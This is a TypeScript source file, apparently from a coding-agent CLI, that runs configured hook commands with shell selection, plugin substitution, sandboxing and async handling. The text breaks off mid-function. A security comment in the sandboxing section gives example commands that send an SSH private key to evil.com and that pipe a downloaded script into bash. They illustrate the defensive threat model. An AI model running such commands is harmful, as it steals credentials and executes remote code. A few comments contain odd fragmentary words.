import { getOriginalCwd, getProjectRoot } from '../../bootstrap/state.js'
import type { FileSuggestionCommandInput } from '../../types/fileSuggestion.js'
import {
  isAsyncHookJSONOutput,
  type PromptRequest,
  promptRequestSchema,
  type PromptResponse,
} from '../../types/hooks.js'
import type { StatusLineCommandInput } from '../../types/statusLine.js'
import { formatShellPrefixCommand } from '../bash/shellPrefix.js'
import { getCwd } from '../cwd.js'
import { logForDebugging } from '../debug.js'
import { logForDiagnosticsNoPII } from '../diagLogs.js'
import { errorMessage, getErrnoCode } from '../errors.js'
import { getPlatform } from '../platform.js'
import {
  getPersonalPluginEnvSetKeys,
  withPersonalPluginEnvIsolated,
} from '../plugins/functionHooksModules.js'
import { getPluginDataDir } from '../plugins/pluginDirectories.js'
import {
  loadPluginOptionsNw,
  type PluginOptionValues,
  substituteUserConfigVariables,
} from '../plugins/pluginOptionsStorage.js'
import { SandboxManager } from '../sandbox/sandbox-adapter.js'
import { getHookEnvFilePath } from '../sessionEnvironment.js'
import {
  getSettings_DEPRECATED,
  getSettingsForSource,
} from '../settings/settings.js'
import type { HookCommand } from '../settings/types.js'
import { getCachedPowerShellPath } from '../shell/powershellDetection.js'
import { buildPowerShellArgs } from '../shell/powershellProvider.js'
import { DEFAULT_HOOK_SHELL } from '../shell/shellProvider.js'
import { wrapSpawn } from '../ShellCommand.js'
import { jsonParse, jsonStringify } from '../slowOperations.js'
import { getPinnedStorageV5 } from '../storageV5/index.js'
import { firstLineOf } from '../stringUtils.js'
import { subprocessEnv } from '../subprocessEnv.js'
import { TaskOutput } from '../task/TaskOutput.js'
import {
  findGitBashPathOrNull,
  windowsPathToPosixPath,
} from '../windowsPaths.js'
import {
  executeInBackground,
  extractCommandScriptPaths,
} from './hookAsyncRewake.js'
import { pluginDirectoryExists } from './hookCommandRunner.js'
import {
  buildManagedHookIsolatedEnv,
  isManagedCommandHook,
  TOOL_HOOK_EXECUTION_TIMEOUT_MS,
  wrapPowerShellHookWithNoBashAstGuard,
} from './hookCore.js'
import { startHookProgressInterval } from './hookEvents.js'
import { shouldSkipHookDueToTrust } from './hookInputHelpers.js'
import {
  shouldAllowManagedHooksOnly,
  shouldDisableAllHooksIncludingManaged,
} from './hooksConfigSnapshot.js'
import { waitForHookStreams } from './hookStdIO.js'
import type { HookCommandResult } from './hookTypes.js'
import { resolveHookCwd } from './resolveHookCwd.js'
import { type ChildProcessWithoutNullStreams, spawn } from 'child_process'
import { randomUUID } from 'crypto'
import type { HookEvent } from 'src/entrypoints/agentSdkTypes.js'

export async function execCommandHook(
  hook: HookCommand & { type: 'command' },
  hookEvent: HookEvent | 'StatusLine' | 'FileSuggestion',
  hookName: string,
  jsonInput: string,
  signal: AbortSignal,
  hookId: string,
  hookIndex?: number,
  pluginRoot?: string,
  pluginId?: string,
  skillRoot?: string,
  forceSyncExecution?: boolean,
  requestPrompt?: (request: PromptRequest) => Promise<PromptResponse>,
  storageV5?: unknown,
  credentials?: unknown,
): Promise<HookCommandResult> {
  // Gated to once-per-session events to keep diag_log volume bounded.
  // started/completed live inside the try/finally so setup-path throws
  // don't orphan a started marker — that'd be indistinguishable from a hang.
  const shouldEmitDiag =
    hookEvent === 'SessionStart' ||
    hookEvent === 'Setup' ||
    hookEvent === 'SessionEnd'
  const diagStartMs = Date.now()
  let diagExitCode: number | undefined
  let diagAborted = false

  const isWindows = getPlatform() === 'windows'

  // --
  // Per-hook shell selection (phase 1 of docs/design/ps-shell-selection.md).
  // Resolution order: hook.shell → DEFAULT_HOOK_SHELL. The defaultShell
  // fallback (settings.defaultShell) is phase 2 — not wired yet.
  //
  // The bash path is the historical default and stays unchanged. The
  // PowerShell path deliberately skips the Windows-specific bash
  // accommodations (cygpath conversion, .sh auto-prepend, POSIX-quoted
  // SHELL_PREFIX).
  const shellType =
    hook.shell ??
    (isWindows && findGitBashPathOrNull() === null
      ? 'powershell'
      : DEFAULT_HOOK_SHELL)

  const isPowerShell = shellType === 'powershell'

  // --
  // Windows bash path: hooks run via Git Bash (Cygwin), NOT cmd.exe.
  //
  // This means every path we put into env vars or substitute into the command
  // string MUST be a POSIX path (/c/Users/foo), not a Windows path
  // (C:\Users\foo or C:/Users/foo). Git Bash cannot resolve Windows paths.
  //
  // windowsPathToPosixPath() is pure-JS regex conversion (no cygpath shell-out):
  // C:\Users\foo -> /c/Users/foo, UNC preserved, slashes flipped. Memoized
  // (LRU-500) so repeated calls are cheap.
  //
  // PowerShell path: use native paths — skip the conversion entirely.
  // PowerShell expects Windows paths on Windows (and native paths on
  // Unix where pwsh is also available).
  const toHookPath =
    isWindows && !isPowerShell
      ? (p: string) => windowsPathToPosixPath(p)
      : (p: string) => p

  // Set CLAUDE_PROJECT_DIR to the stable project root (not the worktree path).
  // getProjectRoot() is never updated when entering a worktree, so hooks that
  // reference $CLAUDE_PROJECT_DIR always resolve relative to the real repo root.
  const projectDir = getProjectRoot()

  // Substitute ${CLAUDE_PLUGIN_ROOT} and ${user_config.X} in the command string.
  // Order matches MCP/LSP (plugin vars FIRST, then user config) so a user-
  // entered value containing the literal text ${CLAUDE_PLUGIN_ROOT} is treated
  // as opaque — not re-interpreted as a template.
  //
  // Official 2.1.207: shell-form hooks (no `args`) must not embed ${user_config.*}
  // — the substituted value would be re-parsed by the shell (injection). Use
  // exec form `{ "command": "<exe>", "args": ["${user_config.KEY}", ...] }` or
  // read $CLAUDE_PLUGIN_OPTION_<KEY> from the environment instead.
  const USER_CONFIG_REF = /\$\{user_config\.[^}]+\}/
  const isExecForm = Array.isArray(hook.args)
  let command = hook.command
  let execArgs: string[] | undefined = isExecForm
    ? [...(hook.args as string[])]
    : undefined
  let pluginOpts: PluginOptionValues | undefined
  // Reject before any substitution so shell form never interpolates secrets.
  if (!isExecForm && USER_CONFIG_REF.test(hook.command)) {
    const from = pluginId ? `plugin ${pluginId}` : 'plugin'
    throw new Error(
      `Hook from ${from} references \${user_config.*} in a shell-form command. ` +
        `The substituted value would be re-parsed by the shell. Use exec form instead ` +
        `{"command": "<executable>", "args": ["\${user_config.KEY}", ...]} ` +
        `or read $CLAUDE_PLUGIN_OPTION_<KEY> from the hook's environment. ` +
        `Command: ${hook.command}`,
    )
  }
  if (pluginRoot) {
    // Plugin directory gone (orphan GC race, concurrent session deleted it):
    // throw so callers yield a non-blocking error. Running would fail — and
    // `python3 <missing>.py` exits 2, the hook protocol's "block" code, which
    // bricks UserPromptSubmit/Stop until restart. The pre-check is necessary
    // because exit-2-from-missing-script is indistinguishable from an
    // intentional block after spawn.
    if (!(await pluginDirectoryExists(storageV5, pluginRoot))) {
      throw new Error(
        `Plugin directory does not exist: ${pluginRoot}` +
          (pluginId ? ` (${pluginId} — run /plugin to reinstall)` : ''),
      )
    }
    // Inline both ROOT and DATA substitution instead of calling
    // substitutePluginVariables(). That helper normalizes \ → / on Windows
    // unconditionally — correct for bash (toHookPath already produced /c/...
    // so it's a no-op) but wrong for PS where toHookPath is identity and we
    // want native C:\... backslashes. Inlining also lets us use the function-
    // form .replace() so paths containing $ aren't mangled by $-pattern
    // interpretation (rare but possible: \\server\c$\plugin).
    const rootPath = toHookPath(pluginRoot)
    const subPluginVars = (s: string): string => {
      let out = s.replace(/\$\{CLAUDE_PLUGIN_ROOT\}/g, () => rootPath)
      if (pluginId) {
        const dataPath = toHookPath(getPluginDataDir(pluginId))
        out = out.replace(/\$\{CLAUDE_PLUGIN_DATA\}/g, () => dataPath)
      }
      return out
    }
    command = subPluginVars(command)
    if (execArgs) {
      execArgs = execArgs.map(subPluginVars)
    }
    if (pluginId) {
      pluginOpts = await loadPluginOptionsNw(pluginId, credentials)
      // Throws if a referenced key is missing — that means the hook uses a key
      // that's either not declared in manifest.userConfig or not yet configured.
      // Caught upstream like any other hook exec failure.
      // Exec form only: substitute into command + each arg as plain strings.
      if (isExecForm) {
        command = substituteUserConfigVariables(command, pluginOpts)
        execArgs = (execArgs ?? []).map(a =>
          substituteUserConfigVariables(a, pluginOpts!),
        )
      }
      // Shell form: user_config already rejected above; still allow env-only access.
    }
  }

  // On Windows (bash only), auto-prepend `bash` for .sh scripts so they
  // execute instead of opening in the default file handler. PowerShell
  // runs .ps1 files natively — no prepend needed.
  if (isWindows && !isPowerShell && command.trim().match(/\.sh(\s|$|")/)) {
    if (!command.trim().startsWith('bash ')) {
      command = `bash ${command}`
    }
  }

  const isManaged = isManagedCommandHook(hook, hookEvent, pluginRoot, skillRoot)
  const isolated = isManaged
    ? withPersonalPluginEnvIsolated(() =>
        buildManagedHookIsolatedEnv(subprocessEnv()),
      )
    : null
  const personalPluginEnvKeys = isManaged ? getPersonalPluginEnvSetKeys() : []
  if (personalPluginEnvKeys.length > 0) {
    logForDebugging(
      `Hooks: ${hookName} is the organization's and starts without a person's plugin's $.env.set of ${personalPluginEnvKeys.join(', ')}`,
    )
  }
  if (isolated && isolated.strippedKeys.length > 0) {
    logForDebugging(
      `Hooks: ${hookName} is the organization's and starts without the repository settings' env of ${isolated.strippedKeys.join(', ')}`,
    )
  }

  // Official SHELL_PREFIX densable wraps the command via POSIX quoting
  // (formatShellPrefixCommand uses shell-quote). This makes no sense for
  // PowerShell — see design §8.1. For now PS hooks ignore the prefix;
  // a CLAUDE_CODE_PS_SHELL_PREFIX (or shell-aware prefix) is a follow-up.
  const baseEnvForHook = isolated ? isolated.env : subprocessEnv()
  let shellPrefix: string | null =
    baseEnvForHook.CLAUDE_CODE_SHELL_PREFIX || null
  try {
    const { resolveShellPrefix } =
      // eslint-disable-next-line @typescript-eslint/no-require-imports
      require('../residualFinalEnvGates.js') as typeof import('../residualFinalEnvGates.js')
    shellPrefix = resolveShellPrefix(baseEnvForHook)
  } catch {
    // keep raw env fallback
  }
  const finalCommand =
    !isPowerShell && shellPrefix
      ? formatShellPrefixCommand(shellPrefix, command)
      : command

  const hookTimeoutMs = hook.timeout
    ? hook.timeout * 1000
    : TOOL_HOOK_EXECUTION_TIMEOUT_MS

  // Build env vars — all paths go through toHookPath for Windows POSIX conversion
  const envVars: NodeJS.ProcessEnv = {
    ...baseEnvForHook,
    CLAUDE_PROJECT_DIR: toHookPath(projectDir),
  }

  // Plugin and skill hooks both set CLAUDE_PLUGIN_ROOT (skills use the same
  // name for consistency — skills can migrate to plugins without code changes)
  if (pluginRoot) {
    envVars.CLAUDE_PLUGIN_ROOT = toHookPath(pluginRoot)
    if (pluginId) {
      envVars.CLAUDE_PLUGIN_DATA = toHookPath(getPluginDataDir(pluginId))
    }
  }
  // Expose plugin options as env vars too, so hooks can read them without
  // ${user_config.X} in the command string. Sensitive values included — hooks
  // run the user's own code, same trust boundary as reading keychain directly.
  if (pluginOpts) {
    for (const [key, value] of Object.entries(pluginOpts)) {
      // Sanitize non-identifier chars (bash can't ref $FOO-BAR). The schema
      // at schemas.ts:611 now constrains keys to /^[A-Za-z_]\w*$/ so this is
      // belt-and-suspenders, but cheap insurance if someone bypasses the schema.
      const envKey = key.replace(/[^A-Za-z0-9_]/g, '_').toUpperCase()
      envVars[`CLAUDE_PLUGIN_OPTION_${envKey}`] = String(value)
    }
  }
  if (skillRoot) {
    envVars.CLAUDE_PLUGIN_ROOT = toHookPath(skillRoot)
  }

  // CLAUDE_ENV_FILE points to a .sh file that the hook writes env var
  // definitions into; getSessionEnvironmentScript() concatenates them and
  // bashProvider injects the content into bash commands. A PS hook would
  // naturally write PS syntax ($env:FOO = 'bar'), which bash can't parse.
  // Skip for PS — consistent with how .sh prepend and SHELL_PREFIX are
  // already bash-only above.
  if (
    !isPowerShell &&
    (hookEvent === 'SessionStart' ||
      hookEvent === 'Setup' ||
      hookEvent === 'CwdChanged' ||
      hookEvent === 'FileChanged') &&
    hookIndex !== undefined
  ) {
    envVars.CLAUDE_ENV_FILE = await getHookEnvFilePath(hookEvent, hookIndex)
  }

  // Official ies: deleted cwd → originalCwd → projectRoot → homedir → tmpdir.
  // spawn() emits async 'error' for missing cwd rather than throwing.
  const hookCwd = getCwd()
  const safeCwd = await resolveHookCwd(hookCwd, {
    originalCwd: getOriginalCwd(),
    projectRoot: getProjectRoot(),
  })

  // --
  // Spawn. Three paths:
  //
  //   Exec form (hook.args present): spawn(command, args) — no shell.
  //   Official 2.1.207; safe for ${user_config.*} substitution.
  //
  //   Bash shell form: spawn(cmd, [], { shell: <gitBashPath | true> }) —
  //   the shell option makes Node pass the whole string to the shell.
  //
  //   PowerShell shell form: spawn(pwshPath, ['-NoProfile', '-NonInteractive',
  //   '-Command', cmd]) — explicit argv, no shell option.
  //
  // The Git Bash hard-exit in findGitBashPath() is still in place for
  // bash hooks. PowerShell hooks never call it, so a Windows user with
  // only pwsh and shell: 'powershell' on every hook could in theory run
  // without Git Bash — but init.ts still calls setShellIfWindows() on
  // startup, which will exit first. Relaxing that is phase 1 of the
  // design's implementation order (separate PR).

  // SECURITY: Apply network-only sandbox to shell-form hook commands when
  // sandboxing is enabled. Exec form skips shell sandbox wrapping (argv is
  // not re-parsed by a shell).
  // Hooks execute arbitrary shell commands from settings.json without going
  // through the Bash tool's permission prompt. Unlike the full Bash sandbox,
  // hooks only get network restrictions (not filesystem restrictions) because:
  //   - Legitimate hooks (formatters, linters, type checkers) need full
  //     filesystem access to read/write project files
  //   - The core threat from malicious hooks is data exfiltration (e.g.
  //     `curl http://evil.com?key=$(cat ~/.ssh/id_rsa)`) and payload download
  //     (e.g. `wget http://evil.com/malware.sh | bash`)
  //   - Hooks that genuinely need network (notifications) should use the
  //     `http` hook type, which is not affected by this sandbox
  let sandboxedCommand = finalCommand
  if (!isExecForm && !isPowerShell && SandboxManager.isSandboxingEnabled()) {
    try {
      sandboxedCommand = await SandboxManager.wrapWithSandbox(
        finalCommand,
        undefined, // use default shell
        {
          // Network: deny all outbound by default. Hooks that need network
          // should use the `http` hook type instead of shell commands.
          network: {
            allowedDomains: [],
            deniedDomains: [],
          },
          // Filesystem: no additional restrictions beyond sandbox defaults.
          // Hooks need to read/write project files freely (e.g. prettier --write).
          filesystem: {
            allowWrite: ['/'],
            denyWrite: [],
            allowRead: [],
            denyRead: [],
          },
        },
        signal,
      )
      logForDebugging(
        `Hook command sandboxed (network-only): ${hook.command}`,
        { level: 'verbose' },
      )
    } catch (sandboxError) {
      // If sandbox wrapping fails, log and continue without sandbox.
      // This preserves backwards compatibility — hooks that ran before
      // sandbox support was added will still work.
      logForDebugging(
        `Failed to sandbox hook command, running unsandboxed: ${errorMessage(sandboxError)}`,
        { level: 'warn' },
      )
    }
  }

  if (
    isExecForm &&
    typeof command === 'string' &&
    /\s/.test(command) &&
    !/[\\/]/.test(command)
  ) {
    logForDebugging(
      `Hook command "${hook.command}" has both "args" and whitespace in "command". ` +
        `Exec form treats "command" as a single executable name; move the rest into "args". ` +
        `Example: { "command": "node", "args": ["script.js"] }.`,
      { level: 'warn' },
    )
  }

  let child: ChildProcessWithoutNullStreams
  if (isExecForm) {
    child = spawn(command, execArgs ?? [], {
      env: envVars,
      cwd: safeCwd,
      // Prevent visible console window on Windows (no-op on other platforms)
      windowsHide: true,
    }) as ChildProcessWithoutNullStreams
  } else if (shellType === 'powershell') {
    const pwshPath = await getCachedPowerShellPath()
    if (!pwshPath) {
      throw new Error(
        `Hook "${hook.command}" has shell: 'powershell' but no PowerShell ` +
          `executable (pwsh or powershell) was found on PATH. Install ` +
          `PowerShell, or remove "shell": "powershell" to use bash.`,
      )
    }
    const psCommand = wrapPowerShellHookWithNoBashAstGuard(
      finalCommand,
      hook,
      hookEvent,
    )
    child = spawn(pwshPath, buildPowerShellArgs(psCommand), {
      env: envVars,
      cwd: safeCwd,
      // Prevent visible console window on Windows (no-op on other platforms)
      windowsHide: true,
    }) as ChildProcessWithoutNullStreams
  } else {
    // On Windows, use Git Bash explicitly (cmd.exe can't run bash syntax).
    // On other platforms, shell: true uses /bin/sh.
    let shell: string | boolean = true
    if (isWindows) {
      const gitBashPath = findGitBashPathOrNull()
      if (!gitBashPath) {
        throw new Error(
          `Hook "${hook.command}" requires bash but Git Bash was not found. Install Git for Windows or set CLAUDE_CODE_GIT_BASH_PATH, or set "shell": "powershell" on the hook.`,
        )
      }
      shell = gitBashPath
    }
    child = spawn(sandboxedCommand, [], {
      env: envVars,
      cwd: safeCwd,
      shell,
      // Prevent visible console window on Windows (no-op on other platforms)
      windowsHide: true,
    }) as ChildProcessWithoutNullStreams
  }

  // Hooks use pipe mode — stdout must be streamed into JS so we can parse
  // the first response line to detect async hooks ({"async": true}).
  const hookTaskOutput = new TaskOutput(`hook_${child.pid}`, null)
  const shellCommand = wrapSpawn(child, signal, hookTimeoutMs, hookTaskOutput)
  // Track whether shellCommand ownership was transferred (e.g., to async hook registry)
  let shellCommandTransferred = false
  // Track whether stdin has already been written (to avoid "write after end" errors)
  let stdinWritten = false

  if ((hook.async || hook.asyncRewake) && !forceSyncExecution) {
    const processId = `async_hook_${child.pid}`
    logForDebugging(
      `Hooks: Config-based async hook, backgrounding process ${processId}`,
    )

    // Write stdin before backgrounding so the hook receives its input.
    // The trailing newline matches the sync path (L1000). Without it,
    // bash `read -r line` returns exit 1 (EOF before delimiter) — the
    // variable IS populated but `if read -r line; then ...` skips the
    // branch. See gh-30509 / CC-161.
    child.stdin.write(jsonInput + '\n', 'utf8')
    child.stdin.end()
    stdinWritten = true

    const backgrounded = executeInBackground({
      processId,
      hookId,
      shellCommand,
      asyncResponse: { async: true, asyncTimeout: hookTimeoutMs },
      hookEvent,
      hookName,
      command: hook.command,
      asyncRewake: hook.asyncRewake,
      rewakeMessage: hook.rewakeMessage,
      rewakeSummary: hook.rewakeSummary,
      scriptPaths: isExecForm
        ? [command, ...(execArgs ?? [])]
        : extractCommandScriptPaths(finalCommand),
      pluginId,
    })
    if (backgrounded) {
      return {
        stdout: '',
        stderr: '',
        output: '',
        status: 0,
        backgrounded: true,
      }
    }
  }

  let stdout = ''
  let stderr = ''
  let output = ''
  let lastDataAt = 0

  // Set up output data collection with explicit UTF-8 encoding
  child.stdout.setEncoding('utf8')
  child.stderr.setEncoding('utf8')

  let initialResponseChecked = false

  let asyncResolve:
    | ((result: {
        stdout: string
        stderr: string
        output: string
        status: number
      }) => void)
    | null = null
  const childIsAsyncPromise = new Promise<HookCommandResult>(resolve => {
    asyncResolve = resolve
  })

  // Track trimmed prompt-request lines we processed so we can strip them
  // from final stdout by content match (no index tracking → no index drift)
  const processedPromptLines = new Set<string>()
  // Serialize async prompt handling so responses are sent in order
  let promptChain = Promise.resolve()
  // Line buffer for detecting prompt requests in streaming output
  let lineBuffer = ''

  const collectStdout = (data: string) => {
    lastDataAt = Date.now()
    stdout += data
    output += data

    // When requestPrompt is provided, parse stdout line-by-line for prompt requests
    if (requestPrompt) {
      lineBuffer += data
      const lines = lineBuffer.split('\n')
      lineBuffer = lines.pop() ?? '' // last element is an incomplete line

      for (const line of lines) {
        const trimmed = line.trim()
        if (!trimmed) continue

        try {
          const parsed = jsonParse(trimmed)
          const validation = promptRequestSchema().safeParse(parsed)
          if (validation.success) {
            processedPromptLines.add(trimmed)
            logForDebugging(
              `Hooks: Detected prompt request from hook: ${trimmed}`,
            )
            // Chain the async handling to serialize prompt responses
            const promptReq = validation.data
            const reqPrompt = requestPrompt
            promptChain = promptChain.then(async () => {
              try {
                const response = await reqPrompt(promptReq)
                child.stdin.write(jsonStringify(response) + '\n', 'utf8')
              } catch (err) {
                logForDebugging(`Hooks: Prompt request handling failed: ${err}`)
                // User cancelled or prompt failed — close stdin so the hook
                // process doesn't hang waiting for input
                child.stdin.destroy()
              }
            })
          }
        } catch {
          // Not JSON, just a normal line
        }
      }
    }

    // Check for async response on first line of output. The async protocol is:
    // hook emits {"async":true,...} as its FIRST line, then its normal output.
    // We must parse ONLY the first line — if the process is fast and writes more
    // before this 'data' event fires, parsing the full accumulated stdout fails
    // and an async hook blocks for its full duration instead of backgrounding.
    if (!initialResponseChecked) {
      const firstLine = firstLineOf(stdout).trim()
      if (!firstLine.includes('}')) return
      initialResponseChecked = true
      logForDebugging(`Hooks: Checking first line for async: ${firstLine}`)
      try {
        const parsed = jsonParse(firstLine)
        logForDebugging(
          `Hooks: Parsed initial response: ${jsonStringify(parsed)}`,
        )
        if (isAsyncHookJSONOutput(parsed) && !forceSyncExecution) {
          const processId = `async_hook_${child.pid}`
          logForDebugging(
            `Hooks: Detected async hook, backgrounding process ${processId}`,
          )

          const backgrounded = executeInBackground({
            processId,
            hookId,
            shellCommand,
            asyncResponse: parsed,
            hookEvent,
            hookName,
            command: hook.command,
            pluginId,
          })
          if (backgrounded) {
            shellCommandTransferred = true
            asyncResolve?.({
              stdout,
              stderr,
              output,
              status: 0,
            })
          }
        } else if (isAsyncHookJSONOutput(parsed) && forceSyncExecution) {
          logForDebugging(
            `Hooks: Detected async hook but forceSyncExecution is true, waiting for completion`,
          )
        } else {
          logForDebugging(
            `Hooks: Initial response is not async, continuing normal processing`,
          )
        }
      } catch (e) {
        logForDebugging(`Hooks: Failed to parse initial response as JSON: ${e}`)
      }
    }
  }
  const collectStderr = (data: string) => {
    lastDataAt = Date.now()
    stderr += data
    output += data
  }
  child.stdout.on('data', collectStdout)
  child.stderr.on('data', collectStderr)

  const stopProgressInterval = startHookProgressInterval({
    hookId,
    hookName,
    hookEvent,
    getOutput: async () => ({ stdout, stderr, output }),
  })

  let stdoutEnded = false
  let stderrEnded = false
  let stdioClosedWithoutEnd = false
  const stdoutEndPromise = new Promise<void>(resolve => {
    child.stdout.once('end', () => {
      stdoutEnded = true
      resolve()
    })
    child.stdout.once('close', () => {
      if (!stdoutEnded) stdioClosedWithoutEnd = true
      resolve()
    })
  })
  const stderrEndPromise = new Promise<void>(resolve => {
    child.stderr.once('end', () => {
      stderrEnded = true
      resolve()
    })
    child.stderr.once('close', () => {
      if (!stderrEnded) stdioClosedWithoutEnd = true
      resolve()
    })
  })

  // Write to stdin, making sure to handle EPIPE errors that can happen when
  // the hook command exits before reading all input.
  // Note: EPIPE handling is difficult to set up in testing since Bun and Node
  // have different behaviors.
  // TODO: Add tests for EPIPE handling.
  // Skip if stdin was already written (e.g., by config-based async hook path)
  const stdinWritePromise = stdinWritten
    ? Promise.resolve()
    : new Promise<void>((resolve, reject) => {
        child.stdin.on('error', err => {
          // When requestPrompt is provided, stdin stays open for prompt responses.
          // EPIPE errors from later writes (after process exits) are expected -- suppress them.
          if (!requestPrompt) {
            reject(err)
          } else {
            logForDebugging(
              `Hooks: stdin error during prompt flow (likely process exited): ${err}`,
            )
          }
        })
        // Explicitly specify UTF-8 encoding to ensure proper handling of Unicode characters
        child.stdin.write(jsonInput + '\n', 'utf8')
        // When requestPrompt is provided, keep stdin open for prompt responses
        if (!requestPrompt) {
          child.stdin.end()
        }
        resolve()
      })

  // Create promise for child process error
  const childErrorPromise = new Promise<never>((_, reject) => {
    child.on('error', reject)
  })

  // Create promise for child process close - but only resolve after streams end
  // to ensure all output has been collected
  const childClosePromise = new Promise<HookCommandResult>(resolve => {
    child.on('exit', code => {
      const aborted = signal.aborted
      void waitForHookStreams(
        Promise.all([stdoutEndPromise, stderrEndPromise]),
        () => lastDataAt,
      ).then(() => {
        child.stdout.removeListener('data', collectStdout)
        child.stderr.removeListener('data', collectStderr)
        // Strip lines we processed as prompt requests so parseHookOutput
        // only sees the final hook result. Content-matching against the set
        // of actually-processed lines means prompt JSON can never leak
        // through (fail-closed), regardless of line positioning.
        const finalStdout =
          processedPromptLines.size === 0
            ? stdout
            : stdout
                .split('\n')
                .filter(line => !processedPromptLines.has(line.trim()))
                .join('\n')

        resolve({
          stdout: finalStdout,
          stderr,
          output,
          status: code ?? 1,
          aborted,
          ...(code !== null && { exitedNormally: true }),
          ...(!(stdoutEnded && stderrEnded) && { stdioIncomplete: true }),
          ...(stdioClosedWithoutEnd && { stdioClosedWithoutEnd: true }),
        })
      })
    })
  })

  // Race between stdin write, async detection, and process completion
  try {
    if (shouldEmitDiag) {
      logForDiagnosticsNoPII('info', 'hook_spawn_started', {
        hook_event_name: hookEvent,
        index: hookIndex,
      })
    }
    await Promise.race([stdinWritePromise, childErrorPromise])

    // Wait for any pending prompt responses before resolving
    const result = await Promise.race([
      childIsAsyncPromise,
      childClosePromise,
      childErrorPromise,
    ])
    // Ensure all queued prompt responses have been sent
    await promptChain
    diagExitCode = result.status
    diagAborted = result.aborted ?? false
    return result
  } catch (error) {
    // Handle errors from stdin write or child process
    const code = getErrnoCode(error)
    diagExitCode = 1

    if (code === 'EPIPE') {
      logForDebugging(
        'EPIPE error while writing to hook stdin (hook command likely closed early)',
      )
      const errMsg =
        'Hook command closed stdin before hook input was fully written (EPIPE)'
      return {
        stdout: '',
        stderr: errMsg,
        output: errMsg,
        status: 1,
      }
    } else if (code === 'ABORT_ERR') {
      diagAborted = true
      return {
        stdout: '',
        stderr: 'Hook cancelled',
        output: 'Hook cancelled',
        status: 1,
        aborted: true,
      }
    } else {
      // densable 2.1.246 kwe: spawn-fail uses the resolved argv (plugin
      // vars already substituted above), so Y(err) shows the real path
      // instead of a literal ${CLAUDE_PLUGIN_ROOT}.
      const errorMsg = errorMessage(error)
      logForDebugging(
        `Hook command failed to spawn (${hookName}): ${errorMsg}`,
        { level: 'error' },
      )
      const errOutput = `Error occurred while executing hook command: ${errorMsg}`
      return {
        stdout: '',
        stderr: errOutput,
        output: errOutput,
        status: 1,
        spawnFailed: true,
      }
    }
  } finally {
    if (shouldEmitDiag) {
      logForDiagnosticsNoPII('info', 'hook_spawn_completed', {
        hook_event_name: hookEvent,
        index: hookIndex,
        duration_ms: Date.now() - diagStartMs,
        exit_code: diagExitCode,
        aborted: diagAborted,
      })
    }
    stopProgressInterval()
    // Clean up stream resources unless ownership was transferred (e.g., to async hook registry)
    if (!shellCommandTransferred) {
      shellCommand.cleanup()
    }
    // Clean up sandbox artifacts (e.g. bwrap mount-point files on Linux)
    if (sandboxedCommand !== finalCommand) {
      SandboxManager.cleanupAfterCommand()
    }
  }
}

/**
 * Execute status line command if configured
 * @param statusLineInput The structured status input that will be converted to JSON
 * @param signal Optional AbortSignal to cancel hook execution
 * @param timeoutMs Optional timeout in milliseconds for hook execution
 * @returns The status line text to display, or undefined if no command configured
 */
export async function executeStatusLineCommand(
  statusLineInput: StatusLineCommandInput,
  signal?: AbortSignal,
  timeoutMs: number = 5000, // Short timeout for status line
  logResult: boolean = false,
  storageV5?: unknown,
): Promise<string | undefined> {
  // Check if all hooks (including statusLine) are disabled by managed settings
  if (shouldDisableAllHooksIncludingManaged()) {
    return undefined
  }

  // SECURITY: ALL hooks require workspace trust in interactive mode
  // This centralized check prevents RCE vulnerabilities for all current and future hooks
  if (shouldSkipHookDueToTrust()) {
    logForDebugging(
      `Skipping StatusLine command execution - workspace trust not accepted`,
    )
    return undefined
  }

  // When disableAllHooks is set in non-managed settings, only managed statusLine runs
  // (non-managed settings cannot disable managed commands, but non-managed commands are disabled)
  let statusLine
  if (shouldAllowManagedHooksOnly()) {
    statusLine = getSettingsForSource('policySettings')?.statusLine
  } else {
    statusLine = getSettings_DEPRECATED()?.statusLine
  }

  if (!statusLine || statusLine.type !== 'command') {
    return undefined
  }

  // Use provided signal or create a default one
  const abortSignal = signal || AbortSignal.timeout(timeoutMs)

  try {
    // Convert status input to JSON
    const jsonInput = jsonStringify(statusLineInput)

    const result = await execCommandHook(
      statusLine,
      'StatusLine',
      'statusLine',
      jsonInput,
      abortSignal,
      randomUUID(),
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      storageV5 ?? getPinnedStorageV5(),
    )

    if (result.aborted) {
      return undefined
    }

    // For successful hooks (exit code 0), use stdout
    if (result.status === 0) {
      // Trim and split output into lines, then join with newlines
      const output = result.stdout
        .trim()
        .split('\n')
        .flatMap(line => line.trim() || [])
        .join('\n')

      if (output) {
        if (logResult) {
          logForDebugging(
            `StatusLine [${statusLine.command}] completed with status ${result.status}`,
          )
        }
        return output
      }
    } else if (logResult) {
      logForDebugging(
        `StatusLine [${statusLine.command}] completed with status ${result.status}`,
        { level: 'warn' },
      )
    }

    return undefined
  } catch (error) {
    logForDebugging(`Status hook failed: ${error}`, { level: 'error' })
    return undefined
  }
}

/**
 * Execute file suggestion command if configured
 * @param fileSuggestionInput The structured input that will be converted to JSON
 * @param signal Optional AbortSignal to cancel hook execution
 * @param timeoutMs Optional timeout in milliseconds for hook execution
 * @returns Array of file paths, or empty array if no command configured
 */
export async function executeFileSuggestionCommand(
  fileSuggestionInput: FileSuggestionCommandInput,
  signal?: AbortSignal,
  timeoutMs: number = 5000, // Short timeout for typeahead suggestions
  storageV5?: unknown,
): Promise<string[]> {
  // Check if all hooks are disabled by managed settings
  if (shouldDisableAllHooksIncludingManaged()) {
    return []
  }

  // SECURITY: ALL hooks require workspace trust in interactive mode
  // This centralized check prevents RCE vulnerabilities for all current and future hooks
  if (shouldSkipHookDueToTrust()) {
    logForDebugging(
      `Skipping FileSuggestion command execution - workspace trust not accepted`,
    )
    return []
  }

  // When disableAllHooks is set in non-managed settings, only managed fileSuggestion runs
  // (non-managed settings cannot disable managed commands, but non-managed commands are disabled)
  let fileSuggestion
  if (shouldAllowManagedHooksOnly()) {
    fileSuggestion = getSettingsForSource('policySettings')?.fileSuggestion
  } else {
    fileSuggestion = getSettings_DEPRECATED()?.fileSuggestion
  }

  if (!fileSuggestion || fileSuggestion.type !== 'command') {
    return []
  }

  // Use provided signal or create a default one
  const abortSignal = signal || AbortSignal.timeout(timeoutMs)

  try {
    const jsonInput = jsonStringify(fileSuggestionInput)

    const hook = { type: 'command' as const, command: fileSuggestion.command }

    const result = await execCommandHook(
      hook,
      'FileSuggestion',
      'FileSuggestion',
      jsonInput,
      abortSignal,
      randomUUID(),
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
